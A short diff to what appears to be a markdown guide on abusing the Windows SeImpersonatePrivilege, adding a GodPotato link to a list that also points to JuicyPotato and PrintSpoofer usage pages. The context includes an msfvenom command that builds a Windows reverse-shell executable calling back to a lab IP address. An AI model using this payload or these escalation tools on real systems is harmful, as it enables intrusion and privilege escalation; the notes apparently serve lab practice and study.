@@ -42,6 +42,7 @@ From the above scenarion there many ways you can try to exploit this but actuall
 3. JuicyPotato - [JuicyPotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/JuicyPotato.md) - 🖥️ JuicyPotato binary usage
 4. payload with msfvenom specific for windows(msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe)
 5. PrintSpoofer - [PrintSpoofer.md](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/PrintSpoofer.md) - 🖥️ PrintSpoofer binary usage
+6. GodPotato - [GodPotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/GodPotato.md) - 🖥️ GodPotato binary usage
 
 ```
 C:\Users\Public\desktop>dir
